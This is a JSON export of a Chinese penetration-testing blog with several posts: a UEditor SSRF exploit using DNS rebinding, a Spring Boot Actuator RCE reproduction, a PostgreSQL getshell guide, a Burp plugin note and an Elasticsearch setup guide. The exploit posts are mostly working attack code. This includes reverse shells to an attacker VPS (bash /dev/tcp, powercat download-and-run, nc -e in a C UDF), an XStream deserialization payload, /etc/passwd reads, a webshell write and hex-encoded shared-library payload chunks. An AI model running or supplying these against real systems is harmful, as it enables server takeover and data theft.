{"pages":[{"title":"categories","date":"2020-04-07T15:36:59.361Z","path":"categories/index.html","text":""},{"title":"about","date":"2017-12-13T10:22:58.000Z","path":"about.html","text":"本博客本着分享记录技术,生活欢迎大家常来文章如有错误请发送邮件 j1anfen#hotmail.com"},{"title":"friendlink","date":"2017-12-13T05:13:40.000Z","path":"links.html","text":"friendlink"},{"title":"projects","date":"2020-04-07T15:36:59.364Z","path":"projects.html","text":""},{"title":"moods","date":"2020-04-07T15:36:59.363Z","path":"moods.html","text":""},{"title":"tags","date":"2020-04-07T15:36:59.365Z","path":"tags/index.html","text":""}],"posts":[{"title":"UEditor 1.4.3.3验证SSRF漏洞提高DNS rebinding成功率","date":"2019-11-13T10:18:59.000Z","path":"/渗透测试/UEditor 1.4.3.3验证SSRF漏洞提高DNS rebinding成功率/","text":"0x00 前言测试中遇到一个Ueditor 1.4.3.3 php ssrf但是由于DNS rebinding的不稳定性造成复现困难，目前通过延迟等手段可以加大成功率。 0x01 复现过程 参考文章中先设置test.jianfensec.com的NS记录转发到自己的VPS DNS服务器：http://admintony.com/UEditor-1-4-3-3-SSRF-AND-DNS-rebinding-attack.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#coding : utf-8from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverimport timeflag=0class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name global flag if flag &lt; 2: ip=\"47.52.95.35\" flag=flag+1 else: ip=\"192.168.123.130\" flag=0 current_time = time.strftime('%Y.%m.%d %H:%M:%S ',time.localtime(time.time())) print \"[&#123;&#125;]&#123;&#125; ===&gt; &#123;&#125;\".format(current_time,name,ip) answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 启动Web服务： 123456789101112131415161718192021from flask import Flask, Responsefrom werkzeug.routing import BaseConverterimport timeclass Regex_url(BaseConverter): def __init__(self,url_map,*args): super(Regex_url,self).__init__(url_map) self.regex = args[0]app = Flask(__name__)app.url_map.converters['re'] = Regex_url@app.route('/&lt;re(\".*?\"):tmp&gt;')def test(tmp): image = 'Test' #image = file(\"demo.jpg\") resp = Response(image, mimetype=\"image/jpeg\") return respif __name__ == '__main__': app.run(host='0.0.0.0',port=80) 3.不断重放数据包，尝试绕过验证最终将192.168.123.130:8081的内容写入图片这样就可以得到一个可回显SSRF：4.问题出现，DNS rebinding收到缓存和网络影响复现不稳定，重放1000个数据包无效果： 0X02 尝试解决首先是因为DNS缓存导致的问题，我们无法控制客户端但是可以控制前一个请求的返回时间来延迟客户端处理下一个请求的时间，服务端请求加入time.sleep(45)： 1.本地测试DNS缓存释放再请求时间大概为40-50秒 2.检查源码中发现使用get_header函数去获取返回信息，此函数未设置超时所以设置延时不会产生异常，实际测试大概60S是极限，如果Burp请求中存在502可以适当降低sleep时间。在web服务器中加入延迟：这里需要改一下原有脚本当flag&lt;2返回SSRF内网目标IP，请求超过2次则返回外网IP，否则服务器一开始就请求外网IP会卡死：可以发现这里请求了20个包就得到了SSRF内容：从服务器图片中获取内网SSRF内容：","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Burp suite插件获取js/html中隐藏的uri和接口","date":"2019-09-27T15:18:24.000Z","path":"/渗透工具/Burp suite插件获取js_html中隐藏的uri和接口/","text":"burp_jspathhttps://github.com/j1anFen/burp_jspath 获取js文件和html中script标签内容中的接口，用于渗透中发现隐藏API，未授权访问等漏洞。 插件使用了linkfinder探测js中路径的正则语句。 environment jpython 2.7 BurpSuite Proxy Features get js file path get html script tags path filter assets content UsageImport this extension of Burp Suite. Save to log file when there is more content. Referenceregexp code https://github.com/GerbenJavado/LinkFinder/blob/master/linkfinder.py#L29","tags":[],"categories":[{"name":"渗透工具","slug":"渗透工具","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"elasticsearch+kibana搭建配置初体验","date":"2019-08-01T03:17:48.000Z","path":"/环境搭建/elasticsearch+kibana搭建配置初体验/","text":"最近分析一些日志，搭建elasticsearch+kibana玩一玩。 0x00 环境准备1234ubuntu 18.04(不用docker推荐使用centos装)docker --versionDocker version 18.09.7, build 2d0083d 0x00 环境搭建1. Docker123apt install docker.iosudo systemctl start dockersudo systemctl enable docker docker代理1sudo mkdir -p /etc/systemd/system/docker.service.d 在服务目录下新建代理配置文件并添加内容NO_PROXY是不需要代理的地址，比如本地及本地私有仓库等 123vi /etc/systemd/system/docker.service.d/http-proxy.conf[Service] Environment=\"HTTP_PROXY=http://ip:port/\" 2. portainerdocker可视化工具portainerhttps://www.portainer.io/installation/ 12$ docker volume create portainer_data$ docker run -d -p 8000:8000 -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer 3. elasticsearch1docker pull elasticsearch:7.2.0 注：7.2没有type概念，以索引为主，开发者认为不应该把elasticsearch当作单纯数据库看待 访问可视化工具-&gt;volumns模块创建本地卷永久存放elasticsearch日志，数据，配置目录： 3.1 设置卷映射/usr/share/elasticsearch/data -&gt; es_data/usr/share/elasticsearch/config -&gt; es_config 3.2 设置端口映射 3.3 设置单机模式（参考hub）https://hub.docker.com/_/elasticsearch 1discovery.type=single-node 3.4 修改elasticsearch配置文件修改完后启动 12345678910111213141516/var/lib/docker/volumes/es_config/_data# cat elasticsearch.ymlcluster.name: \"docker-cluster\"# 设置局域网可外连network.host: 0.0.0.0# 设置写入缓存清理和限制indices.fielddata.cache.size: 75%indices.breaker.fielddata.limit: 85%# 设置外连否则es会拒绝跨域和一些不允许方法http.cors.enabled: truehttp.cors.allow-origin: \"*\"http.cors.allow-methods: OPTIONS, HEAD, GET, POST, PUT, DELETEhttp.cors.allow-headers: X-Requested-With, Content-Type, Content-Length, X-User 3.5 测试访问 3.6 安装中文ik分词插件1234cd /usr/share/elasticsearch/pluginsmkdir ikcurl -O https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.2.0/elasticsearch-analysis-ik-7.2.0.zipdocker restart [docker-id] 4. kibana搭建1234docker pull kibana:7.2.0port map :5601/usr/share/kibana/config -&gt; kibana_config(本地卷) 4.1 修改配置1234567891011121314/var/lib/docker/volumes/kibana_config/_data# cat kibana.yml## ** THIS IS AN AUTO-GENERATED FILE **## Default Kibana configuration for docker targetserver.name: kibanaserver.host: \"0\"# 配置hostelasticsearch.hosts: [ \"http://192.168.123.135:9200\" ]xpack.monitoring.ui.container.elasticsearch.enabled: true# 设置日志存放logging.dest: /usr/share/kibana/config/kibana-log.txt 4.2 测试启动 0X04 es常用语句以下语句均为7.2环境 1.1 新增索引12345678PUT test1&#123; \"mappings\" : &#123; \"properties\" : &#123; \"field1\" : &#123; \"type\" : \"text\" &#125; &#125; &#125;&#125; 1.2 新增分词索引12345678910111213141516171819202122232425262728293031323334353637PUT data1&#123; \"settings\":&#123; \"analysis\":&#123; \"analyzer\":&#123; \"email_analyzer\":&#123; \"tokenizer\":\"standard\", \"filter\":[ \"lowercase\" ] &#125; &#125; &#125; &#125;, \"mappings\" : &#123; \"properties\" : &#123; \"username\" : &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_smart\" &#125;, \"email\":&#123; \"type\": \"text\", \"analyzer\": \"email_analyzer\", \"search_analyzer\": \"email_analyzer\" &#125;, \"sex\":&#123; \"type\": \"keyword\" &#125;, \"address\" : &#123; \"type\": \"text\", \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_smart\" &#125;, &#125; &#125;&#125; 1.3 查看索引1http://10.10.10.10:9200/_cat/indices 1.4 查看数据查看test1索引下序号为1的数据 1GET test1/_doc/1 1.5 搜索数据1http:&#x2F;&#x2F;10.10.10.10:9200&#x2F;hello&#x2F;_search?pretty&amp;size&#x3D;50&amp;from&#x3D;50 1.6 范围删除删除data1索引下_seq_no序号大于等于50的数据 12345678910POST data1/_delete_by_query&#123; \"query\": &#123; \"range\" : &#123; \"_seq_no\" : &#123; \"gte\" : 50 &#125; &#125; &#125;&#125; 1.7 group by查询检索处所有source字段 12345678910GET data1/_search&#123; \"aggs\":&#123; \"models\":&#123; \"terms\":&#123; \"field\":\"source\" &#125; &#125; &#125;&#125; 0X05 es常用语句Bulk 批量插入 Mysql To Elasticsearch 1https://blog.csdn.net/weixin_39198406/article/details/82983256 0X06 异常报错1ELASTICSEARCH CIRCUITBREAKINGEXCEPTION FIELDDATA DATA TOO LARGE 尝试添加文章中配置文件限制cache的配置其次top看一下内存占用，应该是不够用了。","tags":[],"categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://yoursite.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"Spring Boot Actuators配置不当导致RCE漏洞复现","date":"2019-03-12T12:16:20.000Z","path":"/漏洞复现/Spring Boot Actuators配置不当导致RCE漏洞复现/","text":"漏洞分析源地址：https://www.veracode.com/blog/research/exploiting-spring-boot-actuators 关于springboot监控可以参考以下文章：https://www.freebuf.com/news/193509.html 测试环境，原作者提供的github：https://github.com/artsploit/actuator-testbed 复现过程： 1.Remote Code Execution via ‘/jolokia’前置条件：在jolokia/list目录检索存在logback组件,则可以使用jolokia远程包含logback.xml配置文件，直接执行远程引用字节码：http://127.0.0.1:9090/jolokia/list 1）在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。 &lt;configuration&gt; &lt;insertFromJNDI env-entry-name=&quot;ldap://vps_ip:1389/jndi&quot; as=&quot;appName&quot; /&gt; &lt;/configuration&gt; 2）创建反弹shell的恶意class,并监听端口8081javac Exploit.java -&gt; Exploit.class3）利用marshalsec创建jndi server地址指向恶意class监听的端口8081：4）监听反弹shell端口： 4）访问springboot以下链接触发远程访问VPS地址logback.xml：http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址:8080!/logback.xml触发回显2333端口接收到主机whomai结果： 2. Config modification via ‘/env’当第一种找不到logback配置可以尝试修改env配置文件进行xstream反序列化前置条件：Eureka-Client &lt;1.8.7（多见于Spring Cloud Netflix）比如测试前台json报错泄露包名就是使用netflix：需要以下2个包 spring-boot-starter-actuator（/refresh刷新配置需要） spring-cloud-starter-netflix-eureka-client（功能依赖） 1）在VPS创建xstream文件，使用flask返回application/xml格式数据： # -*- coding: utf-8 -*- # @Time : 2019/3/12 10:06 # @Author : j1anFen # @Site : # @File : run.py # linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1 # windows反弹shell # &lt;string&gt;powershell&lt;/string&gt; # &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);&lt;/string&gt; # &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt; from flask import Flask, Response app = Flask(__name__) @app.route(&#39;/&#39;, defaults={&#39;path&#39;: &#39;&#39;}) @app.route(&#39;/&lt;path:path&gt;&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def catch_all(path): xml = &quot;&quot;&quot;&lt;linked-hash-set&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;powershell&lt;/string&gt; &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);&lt;/string&gt; &lt;string&gt;powercat -c [vps地址] -p 2333 -e cmd&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;/is&gt; &lt;/dataSource&gt; &lt;/dataHandler&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;/linked-hash-set&gt;&quot;&quot;&quot; return Response(xml, mimetype=&#39;application/xml&#39;) if __name__ == &quot;__main__&quot;: app.run(host=&#39;172.31.245.127&#39;, port=2333) 2）启动服务： python3 flask_xstream.py 3）写入配置： POST /env HTTP/1.1 Host: 127.0.0.1:9090 Content-Type: application/x-www-form-urlencoded Content-Length: 68 eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream 刷新触发[POST]：一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少spring-boot-starter-actuator扩展包无法刷新漏洞则无法利用。获取反弹shell： 安全措施可参考：https://xz.aliyun.com/t/2233","tags":[],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"渗透中利用postgresql getshell","date":"2018-01-06T14:14:23.000Z","path":"/渗透测试/渗透中利用postgresql getshell/","text":"0x00 前言研究postgresql数据库如何getshell是在渗透中遇到一个pgAdmin的web管理页面可以直接操作postgresql且通过网上的文章没有达到9.6版本getshell的效果所以便有了以下文章。解决新版本写入函数so文件创建函数失败问题. 0x01 postgresql测试环境搭建安装过程: devel库一定要安装后面用来编译后面需要扩展库postgres.h 1yum install postgresql96-server postgresql96-contrib postgresql-devel postgresql-libs postgresql默认不支持用root启动所以需要建立用户: 12useradd postgrespasswd postgres 然后需要建立一个data目录并给postgres用户为所有者权限 12mkdir /usr/pgsql-9.6/datachown -R postgres /usr/pgsql-9.6/data 然后在 1/usr/pgsql-9.6/bin/initdb 初始数据库(必须做) 启动数据库 1/usr/pgsql-9.6/bin/pg_ctl -D /usr/pgsql-9.6/data -l logfile start 关闭数据库 1/usr/pgsql-9.6/bin/pg_ctl stop 进入数据库命令行界面 1psql -d template1 创建数据库 1CREATE DATABASE postgre; 查看密码 密码=MD5(user+password) 1SELECT usename, passwd FROM pg_shadow; 0x02 读写文件因为和mysql一样利用UDF进行提权所以需要上传文件 1.读文件1.1 创建数据表把读到的文件copy入表:1234drop table wooyun;CREATE TABLE wooyun(t TEXT);COPY wooyun FROM '/etc/passwd';SELECT * FROM wooyun limit 1 offset 0; 1.2 利用postgresql大对象处理来读文件:12Select lo_import('/etc/passwd',12345678);select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a 2.写文件2.1 普通文件写入(webshell):1COPY (select '&lt;?php phpinfo();?&gt;') to '/tmp/1.php'; 2.2 二进制文件写入(利用大数据对象):这里需要分片进行上传就是将文件分成小于等于2KB大小的hex再进行上传,但是在9.6版本中(我测试的版本)必须切割等于2KB的数据上传才会成功,具体到命令执行处详细说明. 1ERROR: pg_largeobject entry for OID 2008, page 0 has invalid data field size 2378 首先创建一个OID作为写入的对象,然后通过0,1,2,3…分片上传但是对象都为12345最后导出到/tmp目录下,收尾删除OID 1234567SELECT lo_create(12345);INSERT INTO pg_largeobject VALUES (12345, 0, decode('7f454c4...0000', 'hex'));INSERT INTO pg_largeobject VALUES (12345, 1, decode('0000000...0000', 'hex'));INSERT INTO pg_largeobject VALUES (12345, 2, decode('f604000...0000', 'hex'));INSERT INTO pg_largeobject VALUES (12345, 3, decode('0000000...7400', 'hex'));SELECT lo_export(12345, '/tmp/test.so');SELECT lo_unlink(12345); 0x03 命令执行1.1 低版本的命令执行可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6 一般8.2以下的版本可以 12CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT; 直接可以执行 1select system('id'); 1.2 高版本的命令执行当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行 12ERROR: incompatible library \"xxx.so\": missing magic blockHINT: Extension libraries are required to use the PG_MODULE_MAGIC macro. 第一步可以先查看postgresql支持的扩展语言: 1select * from pg_language; 如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章:http://static.hx99.net/static/drops/tips-6449.html 当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门 编译反弹shell后门 123456789101112#include \"postgres.h\"#include \"fmgr.h\"#include &lt;stdlib.h&gt;#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endiftext *exec()&#123; system(\"nc -e /bin/bash vpsIPaddress 2333\");&#125; 编译环境见文章头部这个需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库 12gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.sostrip -sx udf.so #缩减so文件大小 将文件hex后去除\\n 1cat udf.so | xxd -ps | tr -d \"\\n\" 接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑.为什么不能小于2048?是因为在postgresql高版本处理中,如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败. 用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割： 1234567891011121314151617181920212223#~/usr/bin/env python 2.7#-*- coding:utf-8 -*-import sysfrom random import randintnumber = randint(1000, 9999)if __name__ == \"__main__\": if len(sys.argv) != 2: print \"Usage:python \" + sys.argv[0] + \"inputfile\" sys.exit() fileobj = open(sys.argv[1],'rb') i = 0 t = -1 s = '' for b in fileobj.read(): i = i + 1 s += b if i % 4096 == 0: t = t + 1 print 'insert into pg_largeobject values (&#123;number&#125;, &#123;block&#125;, decode(\\'&#123;payload&#125;\\',\\'hex\\'));\\n'\\ .format(number=number, block=t, payload=s) s = '' fileobj.close() 分割完成后按照下文中的sql语句执行：1.写入对象2.创建文件3.建立函数4.执行命令5.清理函数 如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数：https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c 这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码） 123456789101112131415161718SELECT lo_create(9023);insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200', 'hex'));insert into pg_largeobject values (9023, 1, decode('0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff', 'hex'));insert into pg_largeobject values (9023, 2, decode('ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420ehex'));insert into pg_largeobject values (9023, 3, decode('000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000